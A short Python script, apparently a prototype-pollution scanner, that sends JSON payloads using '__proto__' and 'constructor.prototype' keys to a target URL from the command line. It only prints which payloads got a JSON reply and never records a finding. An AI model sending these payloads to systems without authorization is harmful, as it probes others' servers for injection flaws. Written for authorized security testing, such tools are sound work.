#!/usr/bin/env python3
"""
Prototype Pollution Scanner
Usage: python proto_pollution.py https://target.com/api
"""

import sys
import requests
import json

class ProtoPollutionScanner:
    def __init__(self, target):
        self.target = target
        self.findings = []
        
    def scan_json(self, payload):
        """Scan with JSON payload"""
        try:
            r = requests.post(self.target, json=payload, timeout=10)
            return r.json()
        except:
            pass
        return None
    
    def test(self):
        """Test for prototype pollution"""
        payloads = [
            {"__proto__": {"polluted": True}},
            {"constructor": {"prototype": {"polluted": True}}},
            {"__proto__.polluted": "test"},
            {"constructor.prototype.polluted": True},
            json.dumps({"__proto__": {"test": "value"}}),
        ]
        
        for payload in payloads:
            result = self.scan_json(payload)
            if result:
                print(f"[*] Tested payload: {payload}")
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python proto_pollution.py <url>")
        sys.exit(1)
    
    scanner = ProtoPollutionScanner(sys.argv[1])
    scanner.test()


if __name__ == "__main__":
    main()